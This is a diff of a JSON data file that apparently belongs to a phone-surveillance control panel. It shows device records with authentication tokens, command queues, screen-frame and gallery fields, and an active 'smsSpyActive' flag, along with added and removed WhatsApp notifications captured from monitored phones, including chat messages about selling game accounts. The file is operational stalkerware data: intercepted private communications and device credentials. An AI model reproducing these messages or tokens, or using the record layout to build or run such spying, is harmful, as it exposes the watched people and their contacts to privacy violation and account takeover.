@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778884798,
+    "lastSeen": 1776778887771,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3626 pesan dari 22 chat",
+        "time": "21/04 20:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778889148
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (685 pesan): ~ barzzstr2",
+        "content": "📷 1jt+ log bind sepaket\nSg REPER max 5\nVault gagah bray",
+        "time": "21/04 20:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778887099
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10312,22 +10328,6 @@
         "time": "21/04 20:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1776777140516
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (651 pesan): ~ ada",
-        "content": "📷 300+\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
-        "time": "21/04 20:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777140498
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3519 pesan dari 22 chat",
-        "time": "21/04 20:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777125446
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778884566,
+    "lastSeen": 1776778887567,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
